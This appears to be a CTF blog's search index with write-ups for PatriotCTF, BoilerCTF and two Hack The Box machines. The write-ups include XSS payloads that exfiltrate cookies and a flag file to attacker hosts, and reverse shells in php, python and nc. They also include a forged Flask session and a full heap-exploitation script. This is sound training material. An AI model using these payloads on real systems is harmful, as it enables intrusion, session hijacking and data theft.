[{"content":"Web giraffe notes The code ban HTTP-X-Forwarded-For header, but we can use X-Forwarded-Host header to bypass it.\nImpersonate First, I get server_start_time by get the respone from /status page. Then, I use flask-unsign to generate a cookie with is_admin set to True and username set to administrator. Then, I send a request to the admin page with this cookie to get the flag.\nCode exploit:\nimport os, requests from datetime import datetime, timedelta import hashlib import subprocess res = requests.get(\u0026#39;http://chal.competitivecyber.club:9999/status\u0026#39;) server_up_time_str = res.content.split(b\u0026#39;Server uptime: \u0026#39;)[1].split(b\u0026#39;\u0026lt;br\u0026gt;\u0026#39;)[0].decode() server_time_str = res.content.split(b\u0026#39;Server time: \u0026#39;)[1].decode() uptime_parts = server_up_time_str.split(\u0026#39;:\u0026#39;) server_up_time = timedelta(hours=int(uptime_parts[0]), minutes=int(uptime_parts[1]), seconds=int(uptime_parts[2])) server_time = datetime.strptime(server_time_str.strip(), \u0026#39;%Y-%m-%d %H:%M:%S\u0026#39;) server_start_time = server_time - server_up_time print(\u0026#34;Server start time:\u0026#34;, server_start_time) server_start_str = server_start_time.strftime(\u0026#39;%Y%m%d%H%M%S\u0026#39;) secure_key = hashlib.sha256(f\u0026#39;secret_key_{server_start_str}\u0026#39;.encode()).hexdigest() cmd_out = subprocess.check_output([\u0026#39;flask-unsign\u0026#39;, \u0026#39;--sign\u0026#39;, \u0026#39;--cookie\u0026#39;, \u0026#34;{\u0026#39;is_admin\u0026#39;: True, \u0026#39;username\u0026#39;: \u0026#39;administrator\u0026#39;}\u0026#34;, \u0026#39;--secret\u0026#39;, secure_key]) cookie = {\u0026#39;session\u0026#39; : cmd_out.decode().rstrip()} response = requests.get(\u0026#39;http://chal.competitivecyber.club:9999/admin\u0026#39;, cookies=cookie) print(response.text) Open Seasame The server has a XSS vulnerability in /api/stats/\u0026lt;id\u0026gt; because the Content-Type header is not set, so the browser will render the response as HTML. I inject script to username params and create id with this username on /api/stats page. After getting that id, send this url to bot. The bot will visit this url and execute the script.\nInjected script:\n\u0026lt;script\u0026gt;fetch(\u0026#39;/api/cal?modifier=;curl https://webhook.site/8f530448-4e2b-4697-909b-9b9a9721c8c0?$(cat flag.txt)\u0026#39;)\u0026lt;/script\u0026gt; Reverse Revioli from base64 import b64decode, b64encode import secrets flipFlops = lambda x: chr(ord(x) - 1) s=\u0026#34;Mwahahaha you will nOcmu{9gtufever crack into my passMmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ympword, i\u0026#39;ll even give you the key and the executable:::: Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV\u0026#34; fourth = \u0026#34;Ocmu{9gtuf\u0026#34;+ \u0026#34;MmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ymp\u0026#34; bittysEnc = \u0026#34;Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV\u0026#34; bittys = b64decode(bittysEnc) third = \u0026#34;\u0026#34; for each in fourth: third += flipFlops(each) second = b64decode(third) onePointFive = int.from_bytes(second, \u0026#34;big\u0026#34;) first = onePointFive ^ int.from_bytes(bittys, \u0026#34;big\u0026#34;) print(first.to_bytes(len(second), \u0026#34;big\u0026#34;)) Packed Full Of Surprises First, using upx to unpack. The unpacked code is AES-EFB encryption.\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad import struct def decrypt_file(input_file, output_file, key, iv): # Create AES cipher object in CFB mode cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128) with open(input_file, \u0026#39;rb\u0026#39;) as infile, open(output_file, \u0026#39;wb\u0026#39;) as outfile: while True: chunk = infile.read(16) # Read in 16-byte chunks if len(chunk) == 0: break decrypted_chunk = cipher.decrypt(chunk) outfile.write(decrypted_chunk) # Key and IV from the C code key = struct.pack(\u0026#39;\u0026lt;QQQQ\u0026#39;, 0xEFCDAB8967452301, 0xFEDCBA9876543210, 0x8796A5B4C3D2E1F0, 0xF1E2D3C4B5A6978) iv = struct.pack(\u0026#39;\u0026lt;QQ\u0026#39;, 0x706050403020100, 0xF0E0D0C0B0A0908) # Decrypt the file decrypt_file(\u0026#39;flag.txt.enc\u0026#39;, \u0026#39;flag_decrypted.txt\u0026#39;, key, iv) print(\u0026#34;Decryption complete. Check \u0026#39;flag_decrypted.txt\u0026#39; for the result.\u0026#34;) Pwn Not So Shrimple Is It from pwn import * from pwn import p64 r = remote(\u0026#39;chal.competitivecyber.club\u0026#39;,8884) # r = process(\u0026#39;./shrimple\u0026#39;) r.sendline(b\u0026#39;a\u0026#39;*43+b\u0026#39;\\0\u0026#39;) r.sendline(b\u0026#39;o\u0026#39;*42+b\u0026#39;\\0\u0026#39;) r.sendline(b\u0026#39;a\u0026#39;*38+b\u0026#39;\\x82\\x12\\x40\\0\u0026#39;) r.interactive() ","permalink":"//localhost:1313/posts/patriotctf-wu/post/","summary":"Web giraffe notes The code ban HTTP-X-Forwarded-For header, but we can use X-Forwarded-Host header to bypass it.\nImpersonate First, I get server_start_time by get the respone from /status page. Then, I use flask-unsign to generate a cookie with is_admin set to True and username set to administrator. Then, I send a request to the admin page with this cookie to get the flag.\nCode exploit:\nimport os, requests from datetime import datetime, timedelta import hashlib import subprocess res = requests.","title":"PatriotCTF shortWU"},{"content":"User flag Recon Firtsly, sea.htb is built from wondercms. You can check it by enumerating the web or searching the string velik71 appeared on the banner.\nChecking the /themes/bike/wcms-modules.json, I found the version of this website is 3.2.0. It has a CVE-2023-41425 that allows an attacker to a remote attacker to execute arbitrary code via a crafted script uploaded to the installModule component.\nI also found a contact.php page which allows us to send infomation including a malicous link to the admin.\nExploitation I use the contact.php page to send a link to the admin to steal the cookie.\nhttp://sea.htb/index.php?page=\u0026#34;\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;script\u0026gt;fetch(\u0026#39;http://\u0026lt;ip\u0026gt;:\u0026lt;port\u0026gt;?cookie=\u0026#39;+document.cookie)\u0026lt;/script\u0026gt;\u0026lt;form action=\u0026#34; Use this cookie to access the admin page\nUse the installModule to upload a reverse shell to the server and access the server as www-data.\nhttp://sea.htb/?installModule=http://10.10.14.64:9000/reverseshell.zip\u0026amp;directoryName=essence\u0026amp;type=themes\u0026amp;token=\u0026lt;token\u0026gt; Enumerate current directory, I found a database.js file in /var/www/sea/data which contains the Bcrypt hash of password. Use john to crack it and it is password of amay. Get the user flag at /home/amay/user.txt\nRoot flag List listened ports opened:\nnetstat -tulnp | grep LISTEN The local host is running a web on port 8080. I use ssh tunnel to access it.\nssh -L 8081:127.0.0.1:8080 amay@10.10.11.28 The web is a System Monitor page. The page get the log_file parameter to read the file and filter the content. It may uses shell script with php system function like system or passthru,\u0026hellip; to read the file. To get flag, I modified the log_file param to shell script to read the root flag and send it to my server.\n; php -r \u0026#39;$sock=fsockopen(\u0026#34;10.10.14.8\u0026#34;,9000);`/bin/sh \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3`;\u0026#39; The shell last for a few seconds, so you can change /bin/sh to cat /root/root.txt to get the root flag. ","permalink":"//localhost:1313/posts/sea-htb/post/","summary":"User flag Recon Firtsly, sea.htb is built from wondercms. You can check it by enumerating the web or searching the string velik71 appeared on the banner.\nChecking the /themes/bike/wcms-modules.json, I found the version of this website is 3.2.0. It has a CVE-2023-41425 that allows an attacker to a remote attacker to execute arbitrary code via a crafted script uploaded to the installModule component.\nI also found a contact.php page which allows us to send infomation including a malicous link to the admin.","title":"Sea Hackthebox"},{"content":"User flag Recon Port scanning: Directory scanning:\nServer open a port (5000) for running a website. After scanning directories, I found 2 interesting directories :\n/support which we can access by For questions button. It has a form to submit a message. By checking its request, I find that it is using POST method to send data to the server. I try to send a message with a payload \u0026lt;h1\u0026gt;alert(1)\u0026lt;/h1\u0026gt; and it responses a alert form which includes header of this request. Additionally, I decode is_admin cookie and get a string which have first part is user and second part is a unreadable string. /dashoard which is only for authenticated account. Exploitation Notice that the form print the header of request, so I try to change the header User-Agent to XSS payload and it works.\nAfter that, I set up a listener and send a payload to get the cookie.\n\u0026lt;script\u0026gt;fetch(\u0026#34;http://10.10.14.65:9030/?cookie=\u0026#34;+document.cookie);\u0026lt;/script\u0026gt; I got the is_admin cookie. Replace the cookie with the one I got, I can access the dashboard page. Use Generate report button, the web will send a request with a parameter data equal the date we choose. I try to change it to a linux command and it works. Then, I use reverse shell payload to get shell.\n;export RHOST=\u0026#34;10.10.14.65\u0026#34;;export RPORT=9001;python3 -c \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026#34;RHOST\u0026#34;),int(os.getenv(\u0026#34;RPORT\u0026#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;sh\u0026#34;)\u0026#39;; Get shell and user flag. Root flag Recon Run sudo -l command, I see that I can run sudo /usr/bin/syscheck as root without password. Command syscheck is looking for the initdb.sh program to execute. When syscheck is run as root, it will execute initdb.sh as root.\nExploitation Create a file initdb.sh with reverse shell payload and make it executable.\nnc -e \u0026#39;/bin/sh\u0026#39; 10.10.14.65 7878 Run syscheck and get root shell. ","permalink":"//localhost:1313/posts/headless-htb/post/","summary":"User flag Recon Port scanning: Directory scanning:\nServer open a port (5000) for running a website. After scanning directories, I found 2 interesting directories :\n/support which we can access by For questions button. It has a form to submit a message. By checking its request, I find that it is using POST method to send data to the server. I try to send a message with a payload \u0026lt;h1\u0026gt;alert(1)\u0026lt;/h1\u0026gt; and it responses a alert form which includes header of this request.","title":"Headless Hackthebox"},{"content":"Reverse Annnnnnny-Second-Now The function super_optimized_calculation is a Fibonacci generator. To solve this chall, we just use the 90th Fibonacci number and modulo it by each number in the v6 array. Code:\nv6=[0]*25 v6[0] = 35831; v6[1] = 143; v6[2] = 1061; v6[3] = 877; v6[4] = 29463179; v6[5] = 229; v6[6] = 112; v6[7] = 337; v6[8] = 1061; v6[9] = 47; v6[10] = 29599; v6[11] = 145; v6[12] = 127; v6[13] = 271639; v6[14] = 127; v6[15] = 353; v6[16] = 193; v6[17] = 191; v6[18] = 337; v6[19] = 1061; v6[20] = 193; v6[21] = 353; v6[22] = 269; v6[23] = 487; v6[24] = 245; a = 2880067194370816120 \u0026amp; ((1\u0026lt;\u0026lt;64)-1) for i in v6: print(chr(a%i),end=\u0026#39;\u0026#39;) js-safe After deobfuscating the code, we can see that the function addToPassword use some operation to check the pass code. If true, it uses this pass code as a key to decrypt the AES encrypted flag.\nfunction addToPassword(_0x43b7e8) { if (_0x12b1c8.length \u0026lt; 0x6) { _0x12b1c8 += _0x43b7e8; _0x38a66f(); if (_0x12b1c8.length === 0x6) { let _0xf3bbf = Array(0x6); for (let _0x2c8c6a = 0x0; _0x2c8c6a \u0026lt; 0x6; _0x2c8c6a += 0x1) { _0xf3bbf[_0x2c8c6a] = _0x12b1c8[_0x2c8c6a].charCodeAt(0x0); } let _0x4cedc7 = true; _0x4cedc7 \u0026amp;= _0xf3bbf[0x4] == _0xf3bbf[0x1] - 0x4; _0x4cedc7 \u0026amp;= _0xf3bbf[0x1] == (_0xf3bbf[0x0] ^ 0x44); _0x4cedc7 \u0026amp;= _0xf3bbf[0x0] == _0xf3bbf[0x2] - 0x7; _0x4cedc7 \u0026amp;= _0xf3bbf[0x3] == (_0xf3bbf[0x2] ^ 0x25); _0x4cedc7 \u0026amp;= _0xf3bbf[0x5] == (_0xf3bbf[0x0] ^ 0x14); _0x4cedc7 \u0026amp;= _0xf3bbf[0x4] == _0xf3bbf[0x1] - 0x4; _0x4cedc7 \u0026amp;= _0xf3bbf[0x0] == (_0xf3bbf[0x3] ^ 0x22); _0x4cedc7 \u0026amp;= _0xf3bbf[0x0] == _0xf3bbf[0x2] - 0x7; _0x4cedc7 \u0026amp;= _0xf3bbf[0x0] == _0xf3bbf[0x5] + 0xc; _0x4cedc7 \u0026amp;= _0xf3bbf[0x2] == _0xf3bbf[0x4] + 0x47; _0x4cedc7 \u0026amp;= _0xf3bbf[0x2] == (_0xf3bbf[0x5] ^ 0x13); _0x4cedc7 \u0026amp;= _0xf3bbf[0x5] == (_0xf3bbf[0x3] ^ 0x36); _0x4cedc7 \u0026amp;= 0x52 == _0xf3bbf[0x3]; if (_0x4cedc7) { document.getElementById(\u0026#34;display\u0026#34;).classList.add(\u0026#34;correct\u0026#34;); let _0x401b01 = CryptoJS.AES.decrypt(\u0026#34;U2FsdGVkX19WKWdho02xWkalqVZ3YrA7QrNN4JPOIb5OEO0CW3Qj8trHrcQNOwsw\u0026#34;, _0x12b1c8).toString(CryptoJS.enc.Utf8); console.log(_0x401b01); document.getElementById(\u0026#34;display\u0026#34;).textContent = _0x401b01; } else { document.getElementById(\u0026#34;display\u0026#34;).classList.add(\u0026#34;wrong\u0026#34;); } } } } After calculating, we get the pass code is p4wR0d. Use this pass code to decrypt the flag.\nFlag: bctf{345y-p4s5w0rd-\u0026gt;w\u0026lt;}\nPwn shall-we-play-a-game Because we can input v7 with the length 86, we can overwrite the return address of the function main to the address of the function global_thermo_nuclear_war to get the flag.\neasy-note This challenge give us a menu which have 5 options: add, delete, view, edit and resize. The binary allow us to modify the content of note whatever it is free or not. To solve it, I use the UAF and tcache poisoning technique to get the shell.\nFirst, we will use double free to leak the address of heap.\nadd(0,0x80) # use for heap leak add(1,0x80) # use for libc leak add(2,0x80) # Prevent consolidation with top chunk # Use double free to leak heap address delete(0) delete(0) view(0) heap =u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x260 log.info(\u0026#39;[+] Heap base: \u0026#39;+hex(heap)) With heap base address, I can get chunk inside the tcache_perthread_struct by overwriting the fd of the chunk at index 0(now it is 0x80 tcache).\nedit(0,8,p64(heap+0x10)) Next, I allocate 2 chunks to get the chunk inside the tcache_perthread_struct. Then, I overwrite the size value of the 0x80 tcache bin, make it look like full.\nadd(3,0x80) add(4,0x80) edit(4,8,p64(0x0700000000000000)) Now, I free the chunk at index 1 to make it into the unsorted bin and leak the libc address.\ndelete(1) view(1) With libc address, I edit the first 0x80 tcache value is __free_hook and make the size value of 0x80 tcache bin is 0. Then, I allocate a 0x80 chunk to get the __free_hook address.\nedit(4,0x78+8,b\u0026#39;\\x00\u0026#39;*0x78+p64(libc.sym[\u0026#39;__free_hook\u0026#39;])) add(5,0x80) Finally, I overwrite the __free_hook with the address of system and get the shell.\nedit(5,8,p64(libc.sym[\u0026#39;system\u0026#39;])) edit(0,8,\u0026#39;/bin/sh\\x00\u0026#39;) delete(0) Full exploit from pwn import * exe = ELF(\u0026#34;./chal_patched\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) ld = ELF(\u0026#34;./ld-2.27.so\u0026#34;) p = process([exe.path]) def add(pos,size): p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) p.recvuntil(b\u0026#39;size?\u0026#39;) p.sendline(str(size).encode()) def delete(pos): p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) def view(pos): p.sendline(b\u0026#39;3\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) def edit(pos,size,mes): p.sendline(b\u0026#39;4\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) p.recvuntil(b\u0026#39;size?\u0026#39;) p.sendline(str(size).encode()) p.sendline(mes) def resize(pos,size): p.sendline(b\u0026#39;6\u0026#39;) p.recvuntil(b\u0026#39;Where?\u0026#39;) p.sendline(str(pos).encode()) p.recvuntil(b\u0026#39;size?\u0026#39;) p.sendline(str(size).encode()) add(0,0x80) add(1,0x80) add(2,0x80) delete(0) delete(0) view(0) heap =u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x260 log.info(\u0026#39;[+] Heap base: \u0026#39;+hex(heap)) # tcache poisoning edit(0,8,p64(heap+0x10)) add(3,0x80) add(4,0x80) edit(4,8,p64(0x0700000000000000)) # Leak libc delete(1) view(1) libc.address = u64(p.recvline().strip().ljust(8, b\u0026#39;\\x00\u0026#39;)) - 0x3ebca0+0x3c000 log.info(\u0026#39;[+] Libc base: \u0026#39;+hex(libc.address)) log.info(\u0026#34;[+] Free hook address: \u0026#34;+hex(libc.sym[\u0026#39;__free_hook\u0026#39;])) edit(4,0x78+8,b\u0026#39;\\x00\u0026#39;*0x78+p64(libc.sym[\u0026#39;__free_hook\u0026#39;])) add(5,0x80) edit(5,8,p64(libc.sym[\u0026#39;system\u0026#39;])) edit(0,8,\u0026#39;/bin/sh\\x00\u0026#39;) delete(0) p.interactive() ","permalink":"//localhost:1313/posts/b01ler-wu/post/","summary":"Reverse Annnnnnny-Second-Now The function super_optimized_calculation is a Fibonacci generator. To solve this chall, we just use the 90th Fibonacci number and modulo it by each number in the v6 array. Code:\nv6=[0]*25 v6[0] = 35831; v6[1] = 143; v6[2] = 1061; v6[3] = 877; v6[4] = 29463179; v6[5] = 229; v6[6] = 112; v6[7] = 337; v6[8] = 1061; v6[9] = 47; v6[10] = 29599; v6[11] = 145; v6[12] = 127; v6[13] = 271639; v6[14] = 127; v6[15] = 353; v6[16] = 193; v6[17] = 191; v6[18] = 337; v6[19] = 1061; v6[20] = 193; v6[21] = 353; v6[22] = 269; v6[23] = 487; v6[24] = 245; a = 2880067194370816120 \u0026amp; ((1\u0026lt;\u0026lt;64)-1) for i in v6: print(chr(a%i),end=\u0026#39;\u0026#39;) js-safe After deobfuscating the code, we can see that the function addToPassword use some operation to check the pass code.","title":"BoilerCTF Write-up"},{"content":"Hi This is my blog. I will write about my journey in CTF and cybersecurity here. If you have any questions, feel free to ask me. I will try to help you as much as I can.\n","permalink":"//localhost:1313/posts/main/","summary":"Hi This is my blog. I will write about my journey in CTF and cybersecurity here. If you have any questions, feel free to ask me. I will try to help you as much as I can.","title":"This is my test blog post"}]